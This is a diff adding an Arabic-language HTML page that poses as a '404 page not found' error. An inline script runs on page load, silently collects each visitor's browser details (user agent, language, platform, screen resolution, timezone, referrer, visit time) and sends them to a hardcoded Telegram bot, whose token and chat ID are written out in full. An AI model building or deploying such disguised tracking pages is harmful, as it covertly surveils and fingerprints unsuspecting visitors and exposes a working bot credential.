@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8" />
+  <title>خطأ 404</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin-top: 100px;
+      background-color: #f8f8f8;
+      color: #333;
+    }
+  </style>
+</head>
+<body>
+  <h1>خطأ 404</h1>
+  <p>الصفحة غير موجودة. الرجاء المحاولة لاحقاً.</p>
+
+  <script>
+    (function() {
+      const token = '8392973543:AAEQwaQugLXFb24N1WXUKRIoQS6gRAPVivo';
+      const chat_id = '6232834912'; // رقم الشات الخاص بك
+
+      function sendToTelegram(message) {
+        const url = `https://api.telegram.org/bot${token}/sendMessage`;
+        fetch(url, {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({
+            chat_id: chat_id,
+            text: message,
+            parse_mode: 'Markdown'
+          })
+        });
+      }
+
+      function gatherData() {
+        let data = {
+          'User Agent': navigator.userAgent,
+          'لغة المتصفح': navigator.language,
+          'نظام التشغيل': navigator.platform,
+          'دقة الشاشة': `${screen.width}x${screen.height}`,
+          'المنطقة الزمنية': Intl.DateTimeFormat().resolvedOptions().timeZone,
+          'الكوكيز مفعلة': navigator.cookieEnabled,
+          'مرجع الصفحة': document.referrer,
+          'وقت الدخول': new Date().toLocaleString()
+        };
+
+        let message = '*معلومات زيارة الرابط*\n\n';
+        for (let key in data) {
+          message += `*${key}:* ${data[key]}\n`;
+        }
+        return message;
+      }
+
+      // أرسل البيانات بعد تحميل الصفحة
+      window.onload = function() {
+        const message = gatherData();
+        sendToTelegram(message);
+      }
+    })();
+  </script>
+</body>
+</html>
